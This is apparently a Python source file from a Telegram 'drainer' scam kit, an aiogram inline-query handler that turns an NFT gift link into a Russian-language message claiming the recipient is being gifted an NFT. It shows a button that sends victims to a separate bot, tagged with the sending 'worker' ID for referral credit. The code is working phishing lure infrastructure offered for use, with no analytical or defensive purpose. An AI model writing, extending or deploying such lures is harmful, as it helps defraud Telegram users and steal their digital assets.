# twork/tdrainer/handlers/inline_handlers.py

import re
from aiogram import Router, types
from aiogram.enums import ParseMode
from aiogram.types import (
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    LinkPreviewOptions
)

router = Router()

@router.inline_query()
async def inline_mode_handler(query: types.InlineQuery):
    text = query.query
    worker_id = query.from_user.id

    match = re.search(r"(https://t\.me/nft/[\w-]+)", text)

    if not match:
        return

    gift_link = match.group(1)
    full_gift_id = gift_link.split('/')[-1]

    accept_button = InlineKeyboardButton(
        text="🎁 Принять",
        url=f"https://t.me/NFTScanero_Bot?start={worker_id}"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[accept_button]])

    message_text = (
        f"🎁 Вам дарят NFT: <b>#{full_gift_id}</b> 🎁\n\n"
        f"{gift_link}\n\n"
        f"Получите подарок, нажав кнопку 'принять'."
    )

    input_content = InputTextMessageContent(
        message_text=message_text,
        parse_mode=ParseMode.HTML,
        link_preview_options=LinkPreviewOptions(
            prefer_large_media=True
        )
    )

    result = InlineQueryResultArticle(
        id=full_gift_id,
        title="Отправить NFT-подарок",
        description=f"Отправить {full_gift_id} с вашей реферальной ссылкой",
        input_message_content=input_content,
        reply_markup=keyboard,
        thumbnail_url="https://telegram.org/file/464001154/1/bI_w5Gk3BFU.275335/bc2fde1e2d403d76a7"
    )

    await query.answer(
        results=[result],
        cache_time=1,
        is_personal=True
    )